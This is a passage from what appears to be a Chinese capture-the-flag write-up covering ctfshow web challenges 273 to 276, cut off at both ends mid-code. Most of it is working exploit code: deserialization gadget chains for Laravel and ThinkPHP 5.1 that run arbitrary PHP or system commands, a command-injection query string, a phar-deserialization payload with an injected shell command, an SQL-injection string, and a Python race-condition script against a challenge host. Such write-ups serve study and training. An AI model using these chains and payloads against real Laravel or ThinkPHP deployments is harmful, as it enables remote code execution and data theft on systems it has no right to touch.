class=\"token variable\">$queueResolver</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>        <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$queueResolver</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>        <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>            <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">queueResolver</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$queueResolver</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre></pre></td></tr><tr><td data-num=\"31\"></td><td><pre><span class=\"token keyword\">namespace</span> <span class=\"token package\">Mockery<span class=\"token punctuation\">\\</span>Loader</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>    <span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">EvalLoader</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre></pre></td></tr><tr><td data-num=\"38\"></td><td><pre><span class=\"token keyword\">namespace</span> <span class=\"token package\">Mockery<span class=\"token punctuation\">\\</span>Generator</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>    <span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">MockDefinition</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>        <span class=\"token keyword\">protected</span> <span class=\"token variable\">$config</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>        <span class=\"token keyword\">protected</span> <span class=\"token variable\">$code</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>        <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$config</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$code</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>            <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">config</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$config</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>            <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">code</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$code</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>    <span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">MockConfiguration</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>        <span class=\"token keyword\">protected</span> <span class=\"token variable\">$name</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>        <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$name</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>        <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre>            <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">name</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$name</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"56\"></td><td><pre></pre></td></tr><tr><td data-num=\"57\"></td><td><pre><span class=\"token keyword\">namespace</span> <span class=\"token package\">Illuminate<span class=\"token punctuation\">\\</span>Queue</span></pre></td></tr><tr><td data-num=\"58\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"59\"></td><td><pre>    <span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">CallQueuedClosure</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"60\"></td><td><pre>        <span class=\"token keyword\">public</span> <span class=\"token variable\">$connection</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"61\"></td><td><pre>        <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$connection</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"62\"></td><td><pre>        <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"63\"></td><td><pre>            <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">connection</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$connection</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"64\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"65\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"66\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"67\"></td><td><pre></pre></td></tr><tr><td data-num=\"68\"></td><td><pre><span class=\"token keyword\">namespace</span></pre></td></tr><tr><td data-num=\"69\"></td><td><pre><span class=\"token punctuation\">&#123;</span>   </pre></td></tr><tr><td data-num=\"70\"></td><td><pre>    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$argc</span><span class=\"token operator\">&lt;</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"71\"></td><td><pre>        <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"Description:\\n\\tUse laravel deserialization to eval php code,don't need to input php tags.\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"72\"></td><td><pre>        <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"\\nUsage:\"</span> <span class=\"token operator\">.</span><span class=\"token variable\">$argv</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">.</span> <span class=\"token string double-quoted-string\">\" &lt;code>\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"73\"></td><td><pre>        <span class=\"token keyword\">exit</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"74\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"75\"></td><td><pre>    <span class=\"token variable\">$code</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$argv</span><span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"76\"></td><td><pre>    <span class=\"token variable\">$mockconfiguration</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name class-name-fully-qualified\">Mockery<span class=\"token punctuation\">\\</span>Generator<span class=\"token punctuation\">\\</span>MockConfiguration</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"pass\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"77\"></td><td><pre>    <span class=\"token variable\">$mockdefination</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name class-name-fully-qualified\">Mockery<span class=\"token punctuation\">\\</span>Generator<span class=\"token punctuation\">\\</span>MockDefinition</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$mockconfiguration</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"&lt;?php \"</span><span class=\"token operator\">.</span><span class=\"token variable\">$code</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\" exit;?>\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"78\"></td><td><pre>    <span class=\"token variable\">$callqueuedclosure</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name class-name-fully-qualified\">Illuminate<span class=\"token punctuation\">\\</span>Queue<span class=\"token punctuation\">\\</span>CallQueuedClosure</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$mockdefination</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"79\"></td><td><pre>    <span class=\"token variable\">$evaload</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name class-name-fully-qualified\">Mockery<span class=\"token punctuation\">\\</span>Loader<span class=\"token punctuation\">\\</span>EvalLoader</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"80\"></td><td><pre>    <span class=\"token variable\">$dispatcher</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name class-name-fully-qualified\">Illuminate<span class=\"token punctuation\">\\</span>Bus<span class=\"token punctuation\">\\</span>Dispatcher</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">array</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$evaload</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"load\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"81\"></td><td><pre>    <span class=\"token variable\">$pendingbroadcast</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name class-name-fully-qualified\">Illuminate<span class=\"token punctuation\">\\</span>Broadcasting<span class=\"token punctuation\">\\</span>PendingBroadcast</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$dispatcher</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$callqueuedclosure</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"82\"></td><td><pre>    <span class=\"token keyword\">echo</span> <span class=\"token function\">urlencode</span><span class=\"token punctuation\">(</span><span class=\"token function\">serialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$pendingbroadcast</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"83\"></td><td><pre><span class=\"token punctuation\">&#125;</span></span></pre></td></tr></table></figure><p>xxxxxxxxxx 0;alter table ctfshow_user change  <code>username</code>   <code>pass2</code>  varchar(100);alter table ctfshow_user change  <code>pass</code>   <code>username</code>  varchar(100);alter table ctfshow_user change  <code>pass2</code>   <code>pass</code>  varchar(100);sql</p>\n<h1 id=\"web-274\"><a class=\"anchor\" href=\"#web-274\">#</a> web 274</h1>\n<p>thinkphp 5.1 反序列化漏洞</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">namespace</span> <span class=\"token package\">think</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">abstract</span> <span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">Model</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token keyword\">protected</span> <span class=\"token variable\">$append</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token keyword\">private</span> <span class=\"token variable\">$data</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">append</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"lin\"</span><span class=\"token operator\">=></span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"calc.exe\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"calc\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">data</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"lin\"</span><span class=\"token operator\">=></span><span class=\"token keyword\">new</span> <span class=\"token class-name\">Request</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">Request</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token keyword\">protected</span> <span class=\"token variable\">$hook</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    <span class=\"token keyword\">protected</span> <span class=\"token variable\">$filter</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"system\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token keyword\">protected</span> <span class=\"token variable\">$config</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>        <span class=\"token comment\">// 表单 ajax 伪装变量</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>        <span class=\"token string single-quoted-string\">'var_ajax'</span>         <span class=\"token operator\">=></span> <span class=\"token string single-quoted-string\">'_ajax'</span><span class=\"token punctuation\">,</span>  </pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    <span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">filter</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"system\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">config</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"var_ajax\"</span><span class=\"token operator\">=></span><span class=\"token string single-quoted-string\">'lin'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">hook</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"visible\"</span><span class=\"token operator\">=></span><span class=\"token punctuation\">[</span><span class=\"token variable\">$this</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"isAjax\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre></pre></td></tr><tr><td data-num=\"26\"></td><td><pre></pre></td></tr><tr><td data-num=\"27\"></td><td><pre><span class=\"token keyword\">namespace</span> <span class=\"token package\">think<span class=\"token punctuation\">\\</span>process<span class=\"token punctuation\">\\</span>pipes</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre></pre></td></tr><tr><td data-num=\"29\"></td><td><pre><span class=\"token keyword\">use</span> <span class=\"token package\">think<span class=\"token punctuation\">\\</span>model<span class=\"token punctuation\">\\</span>concern<span class=\"token punctuation\">\\</span>Conversion</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre><span class=\"token keyword\">use</span> <span class=\"token package\">think<span class=\"token punctuation\">\\</span>model<span class=\"token punctuation\">\\</span>Pivot</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">Windows</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>    <span class=\"token keyword\">private</span> <span class=\"token variable\">$files</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">files</span><span class=\"token operator\">=</span><span class=\"token punctuation\">[</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">Pivot</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre><span class=\"token keyword\">namespace</span> <span class=\"token package\">think<span class=\"token punctuation\">\\</span>model</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre></pre></td></tr><tr><td data-num=\"42\"></td><td><pre><span class=\"token keyword\">use</span> <span class=\"token package\">think<span class=\"token punctuation\">\\</span>Model</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre></pre></td></tr><tr><td data-num=\"44\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">Pivot</span> <span class=\"token keyword\">extends</span> <span class=\"token class-name\">Model</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre><span class=\"token keyword\">use</span> <span class=\"token package\">think<span class=\"token punctuation\">\\</span>process<span class=\"token punctuation\">\\</span>pipes<span class=\"token punctuation\">\\</span>Windows</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre><span class=\"token keyword\">echo</span> <span class=\"token function\">base64_encode</span><span class=\"token punctuation\">(</span><span class=\"token function\">serialize</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">Windows</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr></table></figure><p><code>$lin</code>  GET 赋值</p>\n<h1 id=\"web-275\"><a class=\"anchor\" href=\"#web-275\">#</a> web 275</h1>\n<p><code>__destruct</code>  当对象被销毁时调用，所以我们不需要用到反序列化函数。那么只要 <code>$this-&gt;evilfile</code>  是 <code>true</code>  就可以执行系统命令了。最后再拼接一下命令<br />\n payload</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token operator\">?</span><span class=\"token keyword\">fn</span><span class=\"token operator\">=</span><span class=\"token punctuation\">;</span>cat f<span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>data<span class=\"token punctuation\">:</span> flag<span class=\"token operator\">=</span><span class=\"token number\">123</span></pre></td></tr></table></figure><h1 id=\"web-276\"><a class=\"anchor\" href=\"#web-276\">#</a> web 276</h1>\n<p>在上个题的基础上增了了判断 <code>$this-&gt;admin</code>  所以真的需要我们去通过反序列化修改 <code>admin</code>  的值了。因为题目中没有反序列化函数，所以需要通过其他方式。<br />\n因为题目中有写文件的函数，所以可以通过 <code>file_put_contents</code>  写 <code>phar</code>  文件，然后再通过 <code>file_put_contents</code>  触发 <code>phar</code>  反序列化。当然我们得在删除文件前执行完这两个操作，所以需要用到条件竞争。<br />\n生成 <code>phar</code>  文件</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">filter</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$filename</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"1|cat f*\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$filecontent</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$evilfile</span> <span class=\"token operator\">=</span> <span class=\"token constant boolean\">true</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$admin</span> <span class=\"token operator\">=</span> <span class=\"token constant boolean\">true</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token variable\">$phar</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Phar</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"phar.phar\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token variable\">$phar</span><span class=\"token operator\">-></span><span class=\"token function\">startBuffering</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token variable\">$phar</span><span class=\"token operator\">-></span><span class=\"token function\">setStub</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"&lt;?php __HALT_COMPILER(); ?>\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token variable\">$o</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">filter</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token variable\">$phar</span><span class=\"token operator\">-></span><span class=\"token function\">setMetadata</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$o</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token variable\">$phar</span><span class=\"token operator\">-></span><span class=\"token function\">addFromString</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"test.txt\"</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"test\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token variable\">$phar</span><span class=\"token operator\">-></span><span class=\"token function\">stopBuffering</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></span></pre></td></tr></table></figure><p>条件竞争</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">import</span> requests</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">import</span> threading</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">import</span> base64</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>url <span class=\"token operator\">=</span> <span class=\"token string\">'http://b1238473-a3bb-431f-a39e-3cd285bcb95e.chall.ctf.show/'</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>f <span class=\"token operator\">=</span> <span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span><span class=\"token string\">'./phar.phar'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'rb'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>data <span class=\"token operator\">=</span> f<span class=\"token punctuation\">.</span>read<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>flag <span class=\"token operator\">=</span> <span class=\"token boolean\">False</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">work1</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    requests<span class=\"token punctuation\">.</span>post<span class=\"token punctuation\">(</span>url<span class=\"token operator\">+</span><span class=\"token string\">\"?fn=a\"</span><span class=\"token punctuation\">,</span> data<span class=\"token operator\">=</span>data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">work2</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    <span class=\"token keyword\">global</span> flag</pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    r <span class=\"token operator\">=</span> requests<span class=\"token punctuation\">.</span>post<span class=\"token punctuation\">(</span>url<span class=\"token operator\">+</span><span class=\"token string\">\"?fn=phar://phar.phar/\"</span><span class=\"token punctuation\">,</span> data<span class=\"token operator\">=</span><span class=\"token string\">\"\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token string\">\"flag&#123;\"</span> <span class=\"token keyword\">in</span> r<span class=\"token punctuation\">.</span>text <span class=\"token keyword\">and</span> flag <span class=\"token keyword\">is</span> <span class=\"token boolean\">False</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>        <span class=\"token keyword\">print</span><span class=\"token 